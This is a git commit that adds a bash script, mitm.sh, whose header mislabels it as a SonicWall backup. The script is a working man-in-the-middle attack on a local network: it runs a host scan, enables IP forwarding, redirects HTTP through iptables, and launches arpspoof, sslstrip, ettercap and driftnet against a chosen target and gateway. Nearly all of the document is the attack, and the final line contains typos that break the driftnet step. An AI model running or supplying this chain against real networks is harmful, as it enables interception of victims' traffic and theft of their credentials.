18b3a83c099344bb3fcd8bac521ba43cce8f2b3e
cryptobr <crypto-br@openmailbox.org>
2018-07-05 22:54:28 -0300

    Update and rename mtm.sh to mitm.sh

---
+++ mitm.sh
@@ -0,0 +1,47 @@
+#!/bin/bash
+
+#-------------------------------------------#
+#-- Backup SonicWall -----------------------#
+#-- by: @cryptobr - on Telegram ------------#
+#-------------------------------------------#
+
+# Cear Terminal
+clear
+
+# Input dates
+echo "Tell the network you are running a scanner to:  "
+echo "EX: 192.168.0.0/24 "
+read NET
+netdiscover -r $NET -P
+
+echo "#####################################################################"
+sleep 2
+echo "Informe a interface de rede que está utilizando no momento:  "
+echo "EX: eth0, wlan0"
+read INTERFACE
+echo "Input IP to Target"
+read IP_TARGET
+echo "Input  Gateway"
+read GW
+
+# Enable roting
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "Routing enabled !"
+sleep 1
+
+# Create redirect
+iptables  -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 7777
+echo "Redirect ok"
+sleep 1
+
+# Open terminal with arpspoof 
+gnome-terminal -x sh -c "arpspoof -i $INTERFACE -t $IP_TARGET $GW; exec bash"
+
+# Open terminal with sslstrip
+gnome-terminal -x sh -c "sslstrip -l 7777; exec bash"
+
+# Open terminal with ettercap
+gnome-terminal -x sh -c "ettercap -Tq -i $INTERFACE; exec bash";
+
+# Open terminal with DriftNet
+gnome-terminal -x sh -c "driftinet -i $INTERNFACE; exec bash";
